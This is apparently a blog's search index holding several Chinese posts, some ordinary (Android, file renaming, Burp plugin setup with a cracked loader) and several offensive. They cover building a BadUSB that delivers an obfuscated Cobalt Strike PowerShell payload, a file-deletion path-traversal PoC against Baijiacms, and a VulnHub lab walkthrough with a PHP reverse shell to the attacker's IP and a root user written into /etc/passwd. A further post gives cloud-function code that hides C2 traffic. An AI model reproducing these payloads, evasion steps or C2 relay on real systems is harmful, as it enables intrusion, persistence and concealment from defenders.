<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Android studio新建一个activity</title>
    <url>/2021/03/17/Android%20studio%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AAactivity-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14551779.html">源地址：https://www.cnblogs.com/This-is-Y/p/14551779.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>1、</strong></p>
<p>res-&gt;layout右键新建一个xml-&gt;layout xml file</p>
<img src="1503868-20210317195835357-70993166.png" alt loading="lazy">

<p> </p>
<p> 名字，布局</p>
<img src="1503868-20210317195920797-142464714.png" alt loading="lazy">

<p> </p>
<p> 然后随便写点东西到新建的xml文件中</p>
<p> </p>
<img src="1503868-20210317200228775-1982566868.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p><strong>2、</strong></p>
<p>app-&gt;java-&gt;第一个 。右键-&gt;新建-&gt;java类</p>
<img src="1503868-20210317200317728-1094209561.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> <img src="1503868-20210317200419083-640819000.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> 加入代码</p>
<p> </p>
<p> </p>
<p> </p>
<p><strong>3、</strong></p>
<p>在app-&gt;manifest-&gt;AndroidManifest.xml文件中的&lt;application&gt;标签内添加一个新标签，注册这个activity</p>
<p> </p>
<p>name是新建的activity名字，后面的label、action android:name随意，自己记得就好了</p>
<p> </p>
<p>到这一步就已经建完了。配置一个按钮检测一下</p>
<p> </p>
<p>在Activity_Main.xml中新建一个按钮，</p>
<p> </p>
<p>在MainActivity.java中写onClick函数。不要写在onCreate函数里面了</p>
<p> </p>
<img src="1503868-20210317202726826-1982007743.png" alt loading="lazy">

<p> </p>
<p> 这里的switch用来获取按钮id，用来区分是按下的哪个按钮。后面的这两个东西（）就是之前在manifest文件中添加的&lt;action android:name=“”&gt;。编译器不会联想，要自己输入，区分大小写</p>
<img src="1503868-20210317202835646-936331724.png" alt loading="lazy">

<p> </p>
<p> <img src="1503868-20210317202927158-140619376.png" alt loading="lazy"></p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>BadUSB 利用</title>
    <url>/2020/08/19/BadUSB%20%E5%88%A9%E7%94%A8-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13532603.html">源地址：https://www.cnblogs.com/This-is-Y/p/13532603.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>BadUSB以及编译工具准备</strong></p>
<p>淘宝买的，不包邮，花了30几块大洋</p>
<p>链接就不放了，需要的私信</p>
<p>到手后有一个小包装袋装着，一块芯片，其他三个都是U盘的外壳，拼好长这样</p>
<p>一般来说你都可以去找卖家要写好的脚本和教程</p>
<img src="1503868-20200819232126353-1239224496.jpg" width="1000" loading="lazy">

<p>编译工具用arduino</p>
<p>官网地址：<a class="link" href="https://www.arduino.cc/en/Main/Software">https://www.arduino.cc/en/Main/Software<i class="fas fa-external-link-alt"></i></a></p>
<p>也可以直接通过这个地址下载：<a class="link" href="https://downloads.arduino.cc/arduino-nightly-windows.zip">https://downloads.arduino.cc/arduino-nightly-windows.zip<i class="fas fa-external-link-alt"></i></a></p>
<p> </p>
<p>驱动下载：<a class="link" href="https://pan.baidu.com/s/1YNpOORUnYBgLCfhy-5m4yA">https://pan.baidu.com/s/1YNpOORUnYBgLCfhy-5m4yA<i class="fas fa-external-link-alt"></i></a> 提取码: vpye</p>
<p>安装完驱动后，打开arduino</p>
<p>在文件-&gt; 首选项 中，添加一条<a class="link" href="http://digistump.com/package_digistump_index.json">http://digistump.com/package_digistump_index.json<i class="fas fa-external-link-alt"></i></a></p>
<p> <img src="1503868-20200819233552997-1802551828.png" alt loading="lazy"></p>
<p> </p>
<p> 再打开工具-&gt;  开发板-&gt;开发板管理器</p>
<img src="1503868-20200819233718816-1360516057.png" alt loading="lazy">

<p> </p>
<p> 等待下载完毕索引，搜索Digistump，下载，下载失败的话，就科学网上冲浪</p>
<img src="1503868-20200819233956631-2028299896.png" alt loading="lazy">

<p> </p>
<p>下载完成后，在切换到Digistump</p>
<img src="1503868-20200819234144022-1096082656.png" alt loading="lazy">

<p> </p>
<p>这样的话，在打开，示例中可以找到这些东西</p>
<img src="1503868-20200819234409907-784646639.png" alt loading="lazy">

<p>写好代码按√编译，按-&gt;上传到U盘中，</p>
<img src="1503868-20200819232801145-1814212514.png" alt loading="lazy">

<p> 一般编译用来检测代码是否有问题，当没问题后，就可以点上传，等到下面出现这个提示的时候，就可以插上U盘等待写入了</p>
<p> <img src="1503868-20200819233458537-779180168.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> </p>
<p><strong>CS生成文件</strong></p>
<p> 打开cs，建立监听器</p>
<p>监听器默认的就行</p>
<p>选择payload generator</p>
<img src="1503868-20200819235156260-559494600.png" alt loading="lazy">

<p> </p>
<p> 选择powershell</p>
<img src="1503868-20200819235320606-293181371.png" alt loading="lazy">

<p> 然后会生成一个ps1文件</p>
<p> </p>
<p><strong>混淆免杀</strong></p>
<p>使用Invoke-Obfuscation</p>
<p>github地址：github:<a class="link" href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation<i class="fas fa-external-link-alt"></i></a></p>
<p>在powershell中cd到Invoke-Obfuscation文件目录下，或者直接在Invoke-Obfuscation中打开powershell</p>
<p>执行</p>
<p>Import-Module .\Invoke-Obfuscation.psd1<br>Invoke-Obfuscation</p>
<p>可能会报错，如果是未找到模块，则是文件路径不对，如果是禁止运行脚本</p>
<img src="1503868-20200819095942080-854380167.png" alt>

<p> 出现这种情况以管理员权限打开powershell</p>
<p>执行Set-ExecutionPolicy Unrestricted，选择y</p>
<img src="1503868-20200819100043882-63431022.png" alt loading="lazy">

<p> </p>
<p>之后重新打开powershell窗口就好了</p>
<p>正确执行完后是这样的</p>
<img src="1503868-20200819095036912-531561032.png" alt>

<p>然后执行命令，指定待处理的Ps1文件<br><br>　　set scriptpath 文件路径<br><br>或者指定待处理的ps代码<br><br>　　set scriptblock ‘echo xss’</p>
<p>输入encoding 并选择编码方式</p>
<p>　　输入数字就行</p>
<p>输出结果</p>
<p>　　out 文件位置</p>
<p> </p>
<p><strong>最后</strong></p>
<p>改完了后，把文件上传到服务器，因为我比较懒，整理一个内网穿透工具，在自己电脑上用phpstudy简单弄了一下</p>
<p>搞完后</p>
<p>在arduino中把代码上传到u盘中</p>
<p>代码如下：</p>
<p>之后编译，上传，在出现这个提示后，把badUSB插入电脑就好了，</p>
<img src="1503868-20200819192911528-22768958.png" alt loading="lazy">

<p> </p>
<p> 之后可以在自己电脑上插入测试一下。</p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>Baijiacms 代码审计</title>
    <url>/2022/11/26/Baijiacms-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-This-is-Y/</url>
    <content><![CDATA[<h2 id="系统路由"><a href="#系统路由" class="headerlink" title="系统路由"></a>系统路由</h2><p>这个系统采用的路由大部分由两步组成，我暂且给他们命名为模块，文件</p>
<h3 id="定位模块"><a href="#定位模块" class="headerlink" title="定位模块"></a>定位模块</h3><p>先总结，定位模块由请求参数 act 决定。比如下面的url。就会定位到manager模块下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;baijiacmsV4-4.1.4&#x2F;index.php?mod&#x3D;site&amp;act&#x3D;manager&amp;do&#x3D;database&amp;op&#x3D;delete</span><br></pre></td></tr></table></figure>



<p>系统从index.php文件出发，进行一些关系不是很大的判断后。走到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;includes/baijiacms.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>然后在这个文件里，都是一些简单的过滤（htmlspecialchars），整理请求参数（$_GP = array_merge($_GET, $_POST, $_GP);），以及数据库信息，常用函数文件的包含等。<br>这几段代码要关注一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GP</span>[<span class="string">&#x27;m&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$modulename</span> = <span class="variable">$_GP</span>[<span class="string">&#x27;act&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$modulename</span> = <span class="variable">$_GP</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">………………</span><br><span class="line">………………</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="variable">$_CMS</span>[<span class="string">&#x27;module&#x27;</span>]=<span class="variable">$modulename</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里主要是从请求中提取m或者act参数。取作$modulename，也就是模块名字，模块就是系统目录下的system文件夹下的文件。可以看到模块文件都很统一，都是两个文件夹class和template，两个文件mobile.php和web.php。偶尔有几个模块会有addons.php和common.php。</p>
<p><img src="image-20221126175943465.png" alt="image-20221126175943465"></p>
<p>在确定了$modulename后。代码走到下面的runner.inc.php文件才开始路由。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> WEB_ROOT.<span class="string">&#x27;/includes/baijiacms/runner.inc.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>路由从第二个if判断开始。这个isaddons又出现了，判断是否是插件（没细看代码，从变量命名来判断的）。这里主要关注参数 $modulename和$file  ，代码会将$modulename拼接，定向到对应模块下的mobile.php 或web.php文件内。</p>
<p><img src="image-20221126180243104.png" alt="image-20221126180243104"></p>
<h3 id="定位文件"><a href="#定位文件" class="headerlink" title="定位文件"></a>定位文件</h3><p>先总结，定位模块由请求参数 do 决定。比如下面的url。就会定位到manager模块下的database.php文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;baijiacmsV4-4.1.4&#x2F;index.php?mod&#x3D;site&amp;act&#x3D;manager&amp;do&#x3D;database&amp;op&#x3D;delete</span><br></pre></td></tr></table></figure>



<p>直接来到/includes/baijiacms/runner.inc.php 文件中。找到这一行代码，（可能会找到两处，没关系，看第二处就行，第一处应该是判断插件模块额外判断的）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$method</span> = <span class="string">&#x27;do_&#x27;</span>.<span class="variable">$_GP</span>[<span class="string">&#x27;do&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>在这里代码会给$do加上一个”do_”。比如上例的do=database。就会变成do_database复制给$method</p>
<p><img src="image-20221126181927429.png" alt="image-20221126181927429"></p>
<p>在赋值，判断该方法存在后，就又把do_给去掉，拼接成文件名。跳到模块对应文件中了。</p>
<p><img src="image-20221126182305948.png" alt="image-20221126182305948"></p>
<p><img src="image-20221126182434549.png" alt="image-20221126182434549"></p>
<p>这里$filephp=”manager/class/web/database.php”</p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>见上篇</p>
<h2 id="文件删除漏洞"><a href="#文件删除漏洞" class="headerlink" title="文件删除漏洞"></a>文件删除漏洞</h2><p>（事后发现已经被人挖到了。<a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25873">CVE-2020-25873<i class="fas fa-external-link-alt"></i></a>）</p>
<p>漏洞点在system/manager/class/web/database.php文件中第253行的rmdirs($path . $d);</p>
<p><img src="image-20221127012249402.png" alt="image-20221127012249402"></p>
<p>首先需要访问首页的备份与还原，备份一次，因为初始状态下，/config/data_backup/文件夹是不存在的，如果不进行备份来创建该文件夹，后续在</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_dir(<span class="variable">$path</span> . <span class="variable">$d</span>)) </span><br></pre></td></tr></table></figure>

<p>这里判断时会一直false。</p>
<p>在rmdirs函数中，会递归删除传入的文件夹中<strong>所有文件</strong>。</p>
<p><img src="image-20221127012832594.png" alt="image-20221127012832594"></p>
<p>这里我在测试时，在/tmp目录下创建了一个test文件夹。在文件夹下创建了两个文件passwd和shadow。</p>
<p><img src="image-20221127013041995.png" alt="image-20221127013041995"></p>
<p>随后就可以开始构造payload。其中前面的act=manager&amp;do=database&amp;op=delete是为了使代码走到这里，id的值为../../../../../../../../../../../../../../tmp/test的base64编码</p>
<p>POC: <a class="link" href="http://127.0.0.1/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=manager&amp;do=database&amp;op=delete&amp;id=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3Rlc3Q=">http://127.0.0.1/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=manager&amp;do=database&amp;op=delete&amp;id=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3Rlc3Q=<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20221127013748784.png" alt="image-20221127013748784"></p>
<p>遍历所有文件，拼接路径，随后使用unlink删除</p>
<p><img src="image-20221127013819234.png" alt="image-20221127013819234"></p>
<p><img src="image-20221127013847753.png" alt="image-20221127013847753"></p>
]]></content>
  </entry>
  <entry>
    <title>AI-Web1靶机渗透</title>
    <url>/2019/12/18/AI-Web1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12064615.html">源地址：https://www.cnblogs.com/This-is-Y/p/12064615.html<i class="fas fa-external-link-alt"></i></a></p>
<p>先上一张图：</p>
<img src="1503868-20191218195827401-2141380450.png" alt>

<p> </p>
<p> </p>
<p> </p>
<p>靶机信息及地址：<a class="link" href="https://www.vulnhub.com/entry/ai-web-1,353/">https://www.vulnhub.com/entry/ai-web-1,353/<i class="fas fa-external-link-alt"></i></a></p>
<p>下载到靶机后，在VMware里打开，kali使用arp-scan -l 扫到</p>
<img src="1503868-20191218200000963-1007936599.png" alt>

<p> </p>
<p>在浏览器里打开，只有这样一句话：（我谷歌了一下这句话，没找到啥，，，，多此一举==）</p>
<img src="1503868-20191218200033526-938099390.png" alt>

<p> </p>
<p>然后开始dirsearch扫目录：</p>
<p>python dirsearch.py -u <a class="link" href="http://192.168.182.133/">http://192.168.182.133/<i class="fas fa-external-link-alt"></i></a> -e *</p>
<p>只有这两个有用的信息</p>
<img src="1503868-20191218200430184-2081168786.png" alt>

<p> </p>
<p>查看robots.txt文件</p>
<p> </p>
<p> <img src="1503868-20191218200528495-727029718.png" alt></p>
<p> </p>
<p>访问没有得到什么东西，继续扫</p>
<p>python dirsearch.py -u <a class="link" href="http://192.168.182.133/m3diNf0/">http://192.168.182.133/m3diNf0/<i class="fas fa-external-link-alt"></i></a> -e *</p>
<p>这里扫出info.php（先留着）</p>
<p> </p>
<img src="1503868-20191218200706669-1920929001.png" alt>

<p> </p>
<p>第二个，python dirsearch.py -u <a class="link" href="http://192.168.182.133/se3reTdir777">http://192.168.182.133/se3reTdir777<i class="fas fa-external-link-alt"></i></a> -e *</p>
<p>这里只扫出一个注入界面</p>
<img src="1503868-20191218200846673-1187341100.png" alt>

<p> </p>
<p> </p>
<p>火狐确认参数后 （     uid=123&amp;Operation=Submit       ） </p>
<p>sqlmap启动！</p>
<p>sqlmap <a class="link" href="http://192.168.182.133/se3reTdir777/index.php/login/">http://192.168.182.133/se3reTdir777/index.php/login/<i class="fas fa-external-link-alt"></i></a> –data ‘uid=123&amp;Operation=Submit’ –dbs </p>
<p>（新学会的post传参方法，再也不用bp抓包保存用 -r 来跑sqlmap了）</p>
<p>按部就班得的跑，得到这些数据</p>
<img src="1503868-20191218201503263-23341282.png" alt>

<p> </p>
<p> </p>
<p> </p>
<img src="1503868-20191218201439759-1396533858.png" alt>

<p> </p>
<p> </p>
<p> 扫出来3个账号密码，但是似乎在嘲讽我，毕竟我也没找到后台登陆的界面。。。。。。。。</p>
<p>卡了我好久</p>
<hr>
<p> 这之后的90%是看的别人的博客完成的</p>
<p>使用sqlmap反弹一个shell（因为我们有info.php，里面给出了网址路径）</p>
<p>sqlmap <a class="link" href="http://192.168.182.133/se3reTdir777/index.php/login/">http://192.168.182.133/se3reTdir777/index.php/login/<i class="fas fa-external-link-alt"></i></a> –data ‘uid=123&amp;Operation=Submit’ –os-shell</p>
<p>这边的参数，第一个选4，PHP，然后是 n ，第二个选 2 </p>
<img src="1503868-20191218202016950-1405049941.png" alt>

<p> </p>
<p> </p>
<p> 地址在之前的info.php 中找：</p>
<p>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/（为什么是这个，我还要去多学学，目前没搞懂。）<br> <img src="1503868-20191218202203754-1301241232.png" alt></p>
<p>成功后是这个样子的</p>
<img src="1503868-20191218205615611-1977043766.png" alt>

<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> 与此同时，这时候在本机上准备一个php文件，写入</p>
<p>&lt;?php<br>$sock=fsockopen(“192.168.182.128”,9966);<br>exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);<br>?&gt;</p>
<p>（注意：这里的ip地址192.168.182.128<strong>是你的kali的ip</strong>，端口可以随便写，不要冲突就行，其他建议照抄）</p>
<p>然后shift+右键，打开powershell,使用python搭建一个简易服务器，</p>
<p>python -m http.server 9000</p>
<p>这是在浏览器中输入127.0.0.1:9000就可以看到你刚刚写的文件了</p>
<img src="1503868-20191218202827700-413186127.png" alt>

<p> </p>
<p>学艺不精，为了搞懂这个原理写了好多个文件。</p>
<p>然后回到我们sqlmap写shell的那个界面，使用</p>
<p>wget -S http://你本机的IP地址:9000/aiweb1_1.php来下载</p>
<p>下载成功后是这个样子的</p>
<p> </p>
<p> </p>
<p> </p>
<p> <img src="1503868-20191218210528947-475650130.png" alt></p>
<p> </p>
<p> </p>
<p> 有时候可能会出现这种情况，多试两次就好了</p>
<img src="1503868-20191218210705771-1510620219.png" alt>

<p> </p>
<p> </p>
<p> 然后换一个Terminal窗口，使用nc -lvp 9966监听端口</p>
<img src="1503868-20191218211847905-1986124277.png" alt>

<p> </p>
<p> </p>
<p> </p>
<p>（这里的9966是，上面写的，并且通过wger下载到靶机上的，php文件里的写的端口）</p>
<p>然后切换回之前的terminal窗口，输入php aiweb1_7.php运行文件（实际作用是连接到你的kali的端口）</p>
<img src="1503868-20191218211719547-903106645.png" alt>

<p> </p>
<p> </p>
<p> 如果另一边监听没反应，多是两次，实在不行，检查php代码有没有写好，ip有没有填错。</p>
<p>正常情况是这个样子的，这样子就是已经连接上了</p>
<p> </p>
<p> <img src="1503868-20191218211913637-942454172.png" alt></p>
<p> </p>
<p> </p>
<p> 可以用id，whoami等命令查看一些信息</p>
<img src="1503868-20191218212036680-342654664.png" alt>

<p> </p>
<p> </p>
<p>然后在这里， 使用python提升为交互式shell</p>
<p>python -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
<img src="1503868-20191218212157861-1701848270.png" alt>

<p> </p>
<p> </p>
<p> 增加一个root权限用户</p>
<p>先对密码进行加密</p>
<p>openssl passwd -1 -salt abc 000000</p>
<p> 再写入账号密码</p>
<p> </p>
<p>echo ‘abc:$1$abc$yzqAxwzjwaO0BUFj9nRwF/:0:0::/root:/bin/bash’&gt;&gt;/etc/passwdsu</p>
<p>切换用户</p>
<p>su abc </p>
<img src="1503868-20191218232150869-602649788.png" alt>

<p> </p>
<p>这样子就实现了提权</p>
<p>之后cat /root/flag.txt就得到了flag</p>
<img src="1503868-20191218232410250-1346748829.png" alt>

<p> </p>
<p> 先总结一下学到的，sqlmap反弹shell，以及反弹shell的原理，python在本地搭建一个简易服务器，wget下载文件，echo写入/etc/passwd文件添加新root用户再切换用户实现提权（大部分现在只是一个初步了解的阶段，还需要不断练习提升，熟悉）</p>
<p>再说说不会的</p>
<p>（1）sqlmap –os-shell时，为什么是选择/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/这个路径</p>
<p>（2）php文件中的代码中的这一句exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);具体是什么意思，如何理解</p>
<p>（3）python -c ‘import pty;pty.spawn(“/bin/bash”)’这玩意儿又是个啥东西</p>
<p>（4）echo ‘abc:$1$abc$yzqAxwzjwaO0BUFj9nRwF/:0:0::/root:/bin/bash’&gt;&gt;/etc/passwdsu写入文件的格式，参数</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>Burp 插件开发学习笔记</title>
    <url>/2023/05/18/Burp-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-This-is-Y/</url>
    <content><![CDATA[<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>burp从2022.9.1版本后，就换了新api，虽然可以向下兼容，但是新api的资料太少了，所以我下了一个2022.3.7的版本来学习插件开发</p>
<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>先简单配置好环境，</p>
<p>idea动态调试</p>
<p><img src="image-20230518102828924.png" alt="image-20230518102828924"></p>
<p>burp启动，我下的时<a class="link" href="http://www.ddosi.org上的burp,启动vbs脚本内容如下/">www.ddosi.org上的burp，启动vbs脚本内容如下<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;java  --illegal-access=permit -Xmx8G -XX:-UseParallelGC -noverify --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -javaagent:BurpSuiteLoader_v2022.3.7.jar -Dfile.encoding=utf-8  -jar burpsuite_pro_v2022.3.7.jar&quot;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>而这是配合idea动态调试的启动脚本，多加了一段  -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005   </p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;java     -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005     --illegal-access=permit -Xmx8G -XX:-UseParallelGC -noverify --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -javaagent:BurpSuiteLoader_v2022.3.7.jar -Dfile.encoding=utf-8 -jar burpsuite_pro_v2022.3.7.jar&quot;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>







<p><img src="image-20230518102906183.png" alt="image-20230518102906183"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>感谢bit4woo大佬<br><a class="link" href="https://github.com/bit4woo/burp-api-drops">https://github.com/bit4woo/burp-api-drops<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/bit4woo/burp-api-common">https://github.com/bit4woo/burp-api-common<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/bit4woo/Burp_Extender_random_X-Forward-For">https://github.com/bit4woo/Burp_Extender_random_X-Forward-For<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://t0data.gitbooks.io/burpsuite/content/chapter16.html">https://t0data.gitbooks.io/burpsuite/content/chapter16.html<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>B站缓存剧集散乱，用python移动，重命名文件</title>
    <url>/2020/03/05/B%E7%AB%99%E7%BC%93%E5%AD%98%E5%89%A7%E9%9B%86%E6%95%A3%E4%B9%B1%EF%BC%8C%E7%94%A8python%E7%A7%BB%E5%8A%A8%EF%BC%8C%E9%87%8D%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12423345.html">源地址：https://www.cnblogs.com/This-is-Y/p/12423345.html<i class="fas fa-external-link-alt"></i></a></p>
<p>使用python的shutil库</p>
<p>移动</p>
<p>shutil.move(要移动的文件位置，目标位置）</p>
<p>复制</p>
<p>shutil.copy(要移动的文件位置，目标位置）</p>
<p>如shutil.move(r’E:\41942769\test\111.txt’, r’E:\41942769\test_2\222.txt’)</p>
<p>(这里加在字符串前面的的r是为了防止 ‘&#39; 转义)</p>
<p> </p>
<p>这里是发现b站下载的视频如果有很多集，在文件夹中是如此显示的</p>
<img src="1503868-20200305222945564-1240341573.png" alt>

<img src="1503868-20200305222935760-32275974.png" alt>

<p> </p>
<p> <img src="1503868-20200305223031567-526662282.png" alt></p>
<p> </p>
<p> 每个视频文件在最后都是0.blv的格式，其他的一些json文件，xml文件是视频信息和弹幕信息。</p>
<p>这里用了两个小脚本把视频都放在一起，并且把视频文件命名位在B站中看到的名字</p>
<p>移动</p>
<p>重命名</p>
<p>这边在分集下的文件夹中的entry.json文件中找到视频名字，用json稍微操作一下就可以得到视频名字。</p>
<p>最后结果是这样的</p>
<img src="1503868-20200305223537903-184238024.png" alt>

<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>C2隐藏</title>
    <url>/2021/07/28/C2%E9%9A%90%E8%97%8F-This-is-Y/</url>
    <content><![CDATA[<p>参考：<a class="link" href="https://mp.weixin.qq.com/s/sEzUenuP6lKQVcrDK_sxAw">https://mp.weixin.qq.com/s/sEzUenuP6lKQVcrDK_sxAw<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="创建云函数"><a href="#创建云函数" class="headerlink" title="创建云函数"></a>创建云函数</h2><p><a class="link" href="https://console.cloud.tencent.com/scf/list?rid=1&amp;ns=default">https://console.cloud.tencent.com/scf/list?rid=1&amp;ns=default<i class="fas fa-external-link-alt"></i></a><br>新建，选自定义，事件函数，代码部署，python3.6<br>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf8</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span>(<span class="params">event, context</span>):</span></span><br><span class="line">   response = &#123;&#125;</span><br><span class="line">   path = <span class="literal">None</span></span><br><span class="line">   headers = <span class="literal">None</span></span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       C2=<span class="string">&#x27;你的vpsIP&#x27;</span></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;path&#x27;</span> <span class="keyword">in</span> event.keys():</span><br><span class="line">           path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;headers&#x27;</span> <span class="keyword">in</span> event.keys():</span><br><span class="line">           headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;httpMethod&#x27;</span> <span class="keyword">in</span> event.keys() <span class="keyword">and</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">           resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>) </span><br><span class="line">       <span class="keyword">else</span>:      </span><br><span class="line">           params=event[<span class="string">&#x27;queryString&#x27;</span>]</span><br><span class="line">           resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,params=params,verify=<span class="literal">False</span>)</span><br><span class="line">           <span class="built_in">print</span>(resp.headers)</span><br><span class="line">           <span class="built_in">print</span>(resp.content)</span><br><span class="line">       response=&#123;</span><br><span class="line">           <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">           <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">           <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">           <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">       <span class="built_in">print</span>(e)</span><br><span class="line">   <span class="keyword">finally</span>:</span><br><span class="line">       <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>

<p><img src="image-20210728143619968.png" alt="image-20210728143619968"></p>
<h2 id="配置触发器"><a href="#配置触发器" class="headerlink" title="配置触发器"></a>配置触发器</h2><p>进入函数，触发管理，创建触发器，触发方式选择API网关触发<br><img src="image-20210728143947251.png" alt="image-20210728143947251"><br><img src="image-20210728143817873.png" alt="image-20210728143817873"></p>
<h2 id="配置API网关"><a href="#配置API网关" class="headerlink" title="配置API网关"></a>配置API网关</h2><p>配置完触发器后，点进去，编辑<br><img src="image-20210728144053969.png" alt="image-20210728144053969"><br>改一下路径就行了，保存，发布。<br><img src="image-20210728144140112.png" alt="image-20210728144140112"><br>再次点进去，旁边的公网域名就是等下CS创建监听器要用的域名<br><img src="image-20210728144300135.png" alt="image-20210728144300135"></p>
